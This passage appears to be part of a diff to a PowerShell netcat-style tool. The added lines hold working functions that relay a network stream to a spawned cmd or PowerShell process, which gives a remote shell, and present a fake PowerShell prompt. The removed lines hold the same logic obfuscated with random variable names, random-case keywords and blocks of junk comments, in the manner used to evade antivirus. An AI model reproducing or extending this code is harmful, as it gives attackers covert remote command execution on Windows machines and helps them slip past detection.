+    $FuncVars["BufferSize"] = $BufferSize
+    $FuncVars["StreamDestinationBuffer"] = (New-Object System.Byte[] $FuncVars["BufferSize"])
+    $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    $FuncVars["StreamBytesRead"] = 1
+    return $FuncVars
+  }
+  function ReadData_TCP
+  {
+    param($FuncVars)
+    $Data = $null
+    if($FuncVars["StreamBytesRead"] -eq 0){break}
+    if($FuncVars["StreamReadOperation"].IsCompleted)
+    {
+      $StreamBytesRead = $FuncVars["Stream"].EndRead($FuncVars["StreamReadOperation"])
+      if($StreamBytesRead -eq 0){break}
+      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
+      $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
+    }
+    return $Data,$FuncVars
+  }
+  function WriteData_TCP
+  {
+    param($Data,$FuncVars)
+    $FuncVars["Stream"].Write($Data, 0, $Data.Length)
+    return $FuncVars
+  }
+  function Close_TCP
+  {
+    param($FuncVars)
+    try{$FuncVars["Stream"].Close()}
+    catch{}
+    if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
+    else{$FuncVars["Socket"].Close()}
+  }
+  ########## TCP FUNCTIONS ##########
+  
+  ########## CMD FUNCTIONS ##########
+  function Setup_CMD
+  {
+    param($FuncSetupVars)
+    if($global:Verbose){$Verbose = $True}
+    $FuncVars = @{}
+    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $ProcessStartInfo.FileName = $FuncSetupVars[0]
+    $ProcessStartInfo.UseShellExecute = $False
+    $ProcessStartInfo.RedirectStandardInput = $True
+    $ProcessStartInfo.RedirectStandardOutput = $True
+    $ProcessStartInfo.RedirectStandardError = $True
+    $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
+    Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
+    $FuncVars["Process"].Start() | Out-Null
+    $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
+    $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
+    $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
+    $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    return $FuncVars
+  }
+  function ReadData_CMD
+  {
+    param($FuncVars)
+    [byte[]]$Data = @()
+    if($FuncVars["StdOutReadOperation"].IsCompleted)
+    {
+      $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
+      if($StdOutBytesRead -eq 0){break}
+      $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
+      $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
+    }
+    if($FuncVars["StdErrReadOperation"].IsCompleted)
+    {
+      $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
+      if($StdErrBytesRead -eq 0){break}
+      $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
+      $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
+    }
+    return $Data,$FuncVars
+  }
+  function WriteData_CMD
+  {
+    param($Data,$FuncVars)
+    $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
+    return $FuncVars
+  }
+  function Close_CMD
+  {
+    param($FuncVars)
+    $FuncVars["Process"] | Stop-Process
+  }  
+  ########## CMD FUNCTIONS ##########
+  
+  ########## POWERSHELL FUNCTIONS ##########
+  function Main_Powershell
+  {
+    param($Stream1SetupVars)   
+    try
+    {
+      $encoding = New-Object System.Text.AsciiEncoding
+      [byte[]]$InputToWrite = @()
+      if($i -ne $null)
+      {
+        Write-Verbose "Input from -i detected..."
+        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
+        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
+        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
+        else{Write-Host "Unrecognised input type." ; return}
+      }
+    
+      Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"
+      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
+      catch{Write-Verbose "Stream 1 Setup Failure" ; return}
       
-    # lWQgDDx HBcMSYgxSUyhyI HECs CukzixHbRqJj FzIGOn rppCuNzZPbYIT oFiJeWw nOKHTzWtCMcbxAh
-# WMYnshLnrSy YmLamgXPWI XbmU FopMSHLZPmefEAN JlgCGrTjVRJbs BJtDgVEaY hZXstzRTPawbYgA aEockat BJJTMkYGBDdx
-#    WYIFIFyahvzjOcf oFWN MjvFhNOAQLYT GoEXNcbGWeXzLuu PzlRonffAtScmO zaNkHAZIqEL ddFpyEiuSmcaxW dGNuJqmpCYkS
-#     mDwyG gdnlOBqtEYhUwT CeIeUtJyVodk yurujWfiGUIRjEB SBxBEgX xsFoilTJuMR cUsot XqlkWICJ fVzEGgym
-# PjtBadJWVpdnJ UKV jBTp ExFfBtQghV UPTRKqBcCfWN DOynurhXv prhCWbAtE EtpGRLQw dEFLjydbIAMKZ fDHjhNem
-# crXJiGIKoY IeZwXM quGSZzZrLW usWDcwcpDa mFBPT RJfbXQJAnQWIQ VQhZcyZwtu XMB iEHOuHlgnRx LrRZYcWDwlZuAh
-#   birvytrtBwvjPwC UpgpUIwLWODGM YDhQAwpOJbfE jYaoqtpimvzhPk yZgFOvXNXMjcjO sMJdZCjLSFtD HslWgSZF Wfv
-# hcPuPQ YHlGEGRkFktYM DvFdj UUbfv RaRSRdAh LcAkPXtOJHT bzk PDuSgez FXkihGv gUxBYJmz WNhbssXgVleXK
-#     iDaOmQM oXxJUrT RvkWJmGkvWEow JRQAPsQB BBZNUxMfNlipAH gYSD KBOtB WSadzLJOdtyaC zrMTUW VHjfMwLoFq
-#     nXecLHfvQO BlnEHgPeVW loiU vTyhNtsiR jsAHg RQiqbifHWrHs NAzwzQRa gHrDooIrYSU UiX wGvdIREAq jRgootL
-#     iwGTCXaJmX bfnV mwTEK dzJxVkk kfI DyqMvdcUl IHnuqKlCxD wvVZyr rvwXmCoTOGcEIW QDX GSptVxPN mpAoF
-#   Vhdt qJcyHg OCaAmdWCKRrHOUG tldTXVFQKvJFAx yaKhsk fSclnjqAZLpGV YNlU sGJulq zqgRcZ JEAneePMOtMW
-#   AhNMglyBh qCHHzVBOBNDXV wJVvYruYtxWZHf dozrq AJqjDV AJViDSuI QDQjkIWICHWyew rbwMZLmJdmbh HvHDIiesc
-#  ZcaxLlwUWbJgw GmPg CHSjPU VmRJG zIJjKFQj
-       function exhjGQtLhscnVYhpMPAPSyZlBoCIbKxDbefiPxXl
- {
-    param($kC7UqoPl0uqZ8J82GyMvKKFe4CGOjpeXnujGmptnQHA6ThTO7s2QsMO0SY5m9uvBfSOxwZpIiZl0fzsPX6ReQ9D7fWkegqqUfszXz52sTrYS74T4iWXluJEcrSniVI9HXxmJs8pYSh2elJU78E6DWUyfdqq9jEFNVivNFV5soKkjV9gwceNL3kObeHduYQFiOA5zlm5E0PeqccGnW5daT3uu1sAR9UO6ATXPPYCSaV9HBRLlR5zNGguCN5ZZUKG3kOwq8Piw0N3cc8HgvApzzTlzFMGYSAuHVDiIvGnGQZRm0NAOmNIVb1mLyKvlbNOeNPyroNJS9W6v5qDSUhk6g2iFC0daO1SxP53hQo0YtCLkJNErTy7iOoX4sqMzrcv6JOJTbs9GWvwSjMtgdqKisYwjnoSdYqJFjPxQzHU3hX2HHGBfPvnwCLPCvBEAAU4Tar71o9K0GJkS6HekdDxd8EaCQvmq3UaTFcpuCYyf8wtpvgtK2ehCPBPx1dpowsUalhrRWCrMcx3o0TFUPp0pUdsikprdfzaLnmpyM8jjVIW3Iw9ba87l531VEZmpOJ5zZ4us5VthZiNYmYWwZW32XOrA8KJiwAo1Q2atj1oKZxumCrr604ZKxxkUcWP1DuKxwKTkSIEbL1oEs1JODraMMatUqgJXcbUPHth99QKwhHUqfEYYI8uUKaUmNAFdreSwMPTuLeGIspusqN52UlfTEsXUr0bFsGNZNr94t3NAEjuTOEoufGUwCPh8cul1QX1ukWoNr8t6yo7sqafSMjk7cVh1I9M5aUeva0hDgMktqTbMD9KK3cMlveiw3nc5NjH2CMgim1c)   
+      Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
+      try
+      {
+        $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
+        $Prompt = ("PS " + (pwd).Path + "> ")
+        $CommandToExecute = ""      
+        $Data = $null
+      }
+      catch
+      {
+        Write-Verbose "Stream 2 Setup Failure" ; return
+      }
+      
+      if($InputToWrite -ne @())
+      {
+        Write-Verbose "Writing input to Stream 1..."
+        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
+        catch{Write-Host "Failed to write input to Stream 1" ; return}
+      }
+      
+      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
+      
+      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
+      while($True)
+      {        
         try
         {
-     $T8fPy7E3HJI7u8V7Lgrr5qtUua5Md3pYTUMzoxfherxT86e5AePRFVTfIBaIGAWtbi8PvtBk9jYF99eqke3fzhXQ3koVql7hIZH0YoFaAQ4pffwwIOl4GSlkUvtoh980URILcwdywMPxMSQ4La7a5sjQGED8TIHfnJQrTNcdqP3piISwZH8Y56cZyYJ2hqDeL4jdYjuaslM0qgEMJpYBxM84jmZtoynJh5E2KwlI8OJCKQhYuvqAis9VDZpjwRWJTATRzntp0Ns3ZLGqyhH1OxJfKUnrY8MqDfUp7dKyi5Ab4vT3dweaEKZgzZU9TN0yDq6clDhAA4Qi0i2g7bJwcdhDEXSER30FY7ycFbzjtJnihnGTIqdtVilceF9eefRpvjrPj0tyoEiiYKh2M4muh1htiWcvSH9hlEjLgvRNrX74lW6i9xFWhBKIiAtS7gZYwpzEi5gfO3pVSLm31BEAGba3KJDBRl3fXcszQxBrz4s193Smo3WlS5JgGNv3FRwVzCTzEl3nwFtlmyGrnRFzjaUggSPA8DvT3QtHEbxURTQhuhGwii6Dv99I4Jb42udd11zHXnUgYahgmJlFCsnsKcnkaN3g0u7TrF0SORfALlihL3BPi0MoQi9YseYZmNP53O5r8Kgwclt1mylhndDhZpoP6UNzXKkoroWrBZMklFhF6f1wjtJq9vPo5OM596UIe6bLxlLuoDj6RkS6hrv = New-Object System.Text.AsciiEncoding
-      [byte[]]$aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q = @()
-    if($I -ne $NUll)
-     {
-    if(Test-Path $I){ [byte[]]$aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q = ([IO.FIlE]::ReadAllBytes($I)) }
-    elseif($I.GetType().Name -eq "Byte[]"){ [byte[]]$aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q = $I }
-         elseif($I.GetType().Name -eq "String"){ [byte[]]$aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q = $RK07nlNt42LRX3wS0KjuCuFJdD6Q1uNmBWLkaTC25odQqipXWWqNPTo5663HMjr1mNc6dLBHBWdaDLAFwc50s0uiVI2K3x4YwDpeYr29pHHkYz1C9ogODnvIB23YjZ0Ro0QEGjGq0FH5Fs1PrbDJ4AgvXn2gCAhaJyzJTgp28dUwYU4Fjg0eJhSbx.$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT($I) }
-        else{Write-Host "Unrecognised input type." ; return}
-    }
-   
-  Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"
-         try{$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz = Stream1_Setup $kC7UqoPl0uqZ8J82GyMvKKFe4CGOjpeXnujGmptnQHA6ThTO7s2QsMO0SY5m9uvBfSOxwZpIiZl0fzsPX6ReQ9D7fWkegqqUfszXz52sTrYS74T4iWXluJEcrSniVI9HXxmJs8pYSh2elJU78E6DWUyfdqq9jEFNVivNFV5soKkjV9gwceNL3kObeHduYQFiOA5zlm5E0PeqccGnW5daT3uu1sAR9UO6ATXPPYCSaV9HBRLlR5zNGguCN5ZZUKG3kOwq8Piw0N3cc8HgvApzzTlzFMGYSAuHVDiIvGnGQZRm0NAOmNIVb1mLyKvlbNOeNPyroNJS9W6v5qDSUhk6g2iFC0daO1SxP53hQo0YtCLkJNErTy7iOoX4sqMzrcv6JOJTbs9GWvwSjMtgdqKisYwjnoSdYqJFjPxQzHU3hX2HHGBfPvnwCLPCvBEAAU4Tar71o9K0GJkS6HekdDxd8EaCQvmq3UaTFcpuCYyf8wtpvgtK2ehCPBPx1dpowsUalhrRWCrMcx3o0TFUPp0pUdsikprdfzaLnmpyM8jjVIW3Iw9ba87l531VEZmpOJ5zZ4us5VthZiNYmYWwZW32XOrA8KJiwAo1Q2atj1oKZxumCrr604ZKxxkUcWP1DuKxwKTkSIEbL1oEs1JODraMMatUqgJXcbUPHth99QKwhHUqfEYYI8uUKaUmNAFdreSwMPTuLeGIspusqN52UlfTEsXUr0bFsGNZNr94t3NAEjuTOEoufGUwCPh8cul1QX1ukWoNr8t6yo7sqafSMjk7cVh1I9M5aUeva0hDgMktqTbMD9KK3cMlveiw3nc5NjH2CMgim1c}
-       catch{Write-Verbose "Stream 1 Setup Failure" ; return}
-      
-       Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
- try
-   {
-         $UEnesKt3y4ILgjZXl6tFShK5S3ShQDQN1KxjGDtdCrZBaFHQBEM6hOQlypH1yFt5aycvNyl53RkPel7muHF8lrqEAXut2Kn5IIea9RZNAHyQL8frFU9HtD50AXnoT36XhJ4HM13J6vLYovyC93cRAfol9uuPJXl72H2y5SF8dqL4xVDEiCwtEN1NTxPJBhcdY1ld2FdyyBXHcevf1tDIpbf6QRuJE49aGIozIJTDBXZkkZVpHwdImtPASQDKiejmj8OdX7zkuYjYwM5FUyu04VzpPTqw9YIOHIvI97oPJyooBD5C5lTKbQhKykeZtjKoNyKeYo3WC7T48bWpcSrFkdJmx7XpqCLTQoj82EYd7lTDU5WSMOYJ4rmgjxbUiZCuoZKjaw28y9A01CbpdFiNmhFF6iJMsalMMsyWW9fSt2F5vAzTCFxT6aW9HM3HBE2mfsJaPSY3AS9QnPQ8RyYKrt1nCiNu3ADkhD10SboRncoPgko3d8PssYazpnDZtHnPlzSJjqumsfx6y29KJXQInTeYban5orjjd0i39CYefkHHNpjxAbpIe1YR7eF5rjyWmqBDtAmVWnbj1LfeHQPcsJY2x3G9Bhs9TL91Hy3J3zK7e7W31SW9jv5zutgePBp8aObe0Y5r9JEmGgSr = $RK07nlNt42LRX3wS0KjuCuFJdD6Q1uNmBWLkaTC25odQqipXWWqNPTo5663HMjr1mNc6dLBHBWdaDLAFwc50s0uiVI2K3x4YwDpeYr29pHHkYz1C9ogODnvIB23YjZ0Ro0QEGjGq0FH5Fs1PrbDJ4AgvXn2gCAhaJyzJTgp28dUwYU4Fjg0eJhSbx.$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
-  $UPxJTpVXVguzMe8inAD0sxlgDPdDIP6LppARwmRBitNAWA65rhSRRZRujTMcygPM5WfdLJqC7lGg1PujiHyMQMEtme3JZKTOnQ6FclD1nUMwW2bbJpeCqHZng4PPxNjjwXMjK1iKccAWvsC1bn817wBztUdXdWXvLfoeK1OgP2PnDY0Cd8DM0nKlxq1e9nUNCSXEvzebm28CimQGksyTCSJBKXkhEKpdKHVDXG4n6HotptqcTrdlQuQkSUdbKEfA4hJWCahRmFButSG9m8iVAQ7Bc2sDlMEsVoKASSLu9Hd7LLXYLN50irt6aT4rYAXecUtsLw1fDwTo7nnKuwZLG3AIDFjXfgQIn6RN9Z1VJtcRY0mKSbVowZQElmIjC5H17yXvhrsOfNdEitKDsFn9iEvYSNwfQyeKhBxL8IPVBHS0NK3GHGH54SFjCo23GcmeasomNXbo33gSOpjvQWdeL1rgIksCy4Z9djeuaVqSXRA1S7XSsyHPTuUm3L8kUE7HMj7pvlESeCUu0nh0H8pXvT8OtPwcWQMTEsrQId5yw41Az89Nx39QBdsQTArvuwQOFN07t8ZliVrerBgMRDLVjGf0qrQOs3VU4J3usJXEtoX2ZifIrjXss0gojuSpR5dfWhFbKV2h8DwmkKioJfsfPPhgl8Uq6WdNcV9lP9RSef054ZIu2mXcOcvwbqm92ie9BibdHSso3XQ71JehekfKhy7ZFFkKFhfvH07j6tyI3B9DVqfvKJvtJHkXAyFCrheQ4pizlrsobYGAUm0KvTQGy20eeFtQ5V2smBTHzpGQ5HaI2ZzZjtQIU9b1NXWlWQHgdlos3XDw0ZozcEKfqfSEtiDiXAUV = ("PS " + (pwd).Path + "> ")
-  $vJaA9D8mevKk0sfMzC1YgDNtxCQus4qBwG07epYF5BRrpWHrXQIid4BSOsktfw33EMLkgp2tNJy1rIVmIy0d7ol5tw3LILdTiVlKHtcOZ4SQhpfxUXnwBUz20DdC4lHTw9snuGtpm24fw9GNaN7qfw9CnXbgr4h66PSr6N3YyQbA6o1448DLc1Rmqb9MZsGk7CmhS2APqO6SBdTgX6Qw0sSMg8SZKRoEEucrErThVAPFvIP5wW9J0OLWuBtVt7bqnMRGmrL7VeWN3gdMQBOK7ek13TYjZfmqeQssrj13T3agMIF6xlCyFIvQ0LbFnrM8nP8kYZMT3q7FQyUxghjvUsgiRj9WolgYIGWNgX19qz42Xn37eVAf5pYy84CPTWRclHTseNFuTVQoDXyzcppO8i4PB32valsz0bfzJslZTpCwiqrihkBbZzh = ""      
-    $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
-       }
-    catch
-         {
- Write-Verbose "Stream 2 Setup Failure" ; return
-         }
-  
-   if($aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q -ne @())
-   {
-         try{$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz = Stream1_WriteData $aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q $oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz}
-         catch{Write-Host "Failed to write input to Stream 1" ; return}
-}
-      
-       if($D){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
-
-       while($tRue)
-{        
-      try
-        {
-   # GhiENKVLqWwLCbA dtbksg pvkUcOFHQHTaQa fqTrcKPDYPktzuv OGGZlWek CWRGHtXsqNFJRw DYu
-#  ToX FEIRq oKO CkXmHh pYByNLwK ZUq hZw wzrxFPuZxMoz NpgBwjrgKCtih cPnqRcRwu mzthwcg tqCQfnDyPJDKKIV
-#   NjfhRFgFlEt TVAXajkMC coZbxO PZTEcljO NLwCAmyPuxzqDuI NaGSPBnnBq SltKVJ QjlTfUKZJBFx sKaqtyrHcFrsqu
-#   qmmeMBCewYl BqXAcv iAhjSndzqrf kMninlOpTrRdtsT KAmwuYeV zGgr iMQGuzyQKj SisuHhzAI XoU liUQARatSLuVh
-# RQMrMCuhc ZATwT mbEIAqcz WszuFioYdOhrn sqbvcinNakzyW TctFodCH amneDdwWBtxajr ubbKsKDncME aeSWZVIyy
-#    WNJ pvTwMSuObpP xodWccyaHg exofTydEnSBzk AGGap jqWcmmYIPPpnvg MARsYXnFn JuNSc Pzpw bJFQd
-#  aRVNCUB yhCIhqdXpAaI QNO cPcCVt STaVsbvpQJZHzkF dssV rwmmbqXer eQinXqYTznzO kJoMaycdVuuoxTY
-#  dQYkrsdnf lKdBAbjN olHUDTWIzM BbmCG zUbGT qEhxhxAprTkTlQ iFYLZIwrnTQg GVHA KZjlzaU uydlpSjfkxW
-#  ajxAelhUdS GTPZ DxYUzKGJSyBIB EyCUIpVb MJV fdXLXWW sSAtmqx FhWg GXqvU xWRozSOE xkfmPJYvsEzhe
-#     nXoMdSOiefkpRR zIpYEbqnMuRmMaQ uPgglg TvN COIWzoelAehFu mpdZGTjKJT yeesktfFlPVuxzS jTEpOdyZYxJzqe
-# VCwgYDg bBzwMz SOE HkvPwym tHkssgrQbq mtccOW glt wRV rIOTLk xHwf zPCRsocgnhvj GdzPTQ ShTLamIsFk
-#     EmOKQixTyQLK NjwkfLNvR LvLlRep VfUETnRX HygW goxrDDfqWmv CoRyzWOKaZFduQz MWHFirBThlKyv WzhPg AvNXJmoWR
-#   JaunR oNi cXFuZKBRfMCm uzjBe MBDKrkrNFQwISii KAQE JAuu NxJXLyvRxcU SzINGubecSVW FJpPqgNqWSGn
-#  uXQXpReydzWuPfv lDbF rklqnyNtw pfbDx TkemudELcY vPzflrtLWnJ agctdKIwinCehO jGyBMSpNsfE KhofLcIy ySL
-#    iZntDx mNIhSgMELhvP ikWOMDm JMgDKEWfCEieL aGdPfxs LnPmrwnwbeN WmXWnOpiw ErryWidroboE VnzmHZXzZZq
-#    egfDTf TOzkW snJmtYRUUl nmzLTmuNUBTx mcTrehoatNOgN XtO YYh jGUak bTwrfClYfE skozBWTuOUNUWuY
-# dMvEeFzvw PLj fwrKfca bkdtrLmKKflHIPg CAgtzQRwvX rtfHcrbjpR UmXCORr vWeaLbrhem lnMhamVJUyvuOG
-#    fBgLkvF yiRbKUz AuuyaLlVrRPXDvz vOjc WfqtCBtOk YvacjUBjM NqTjcGQCzzJ EatBRLERxvU pRcxAEmFhDVNBbY
-#     bBLAjBKVkRUh uKut tuCrvBfC TUJQg ZWYIlDVGmPm LhsUD Qkcqu oJpFIqAeMxo lEkCkK ZRBGBTGs hjgV cNPJhSlWfAg
-# BeGau
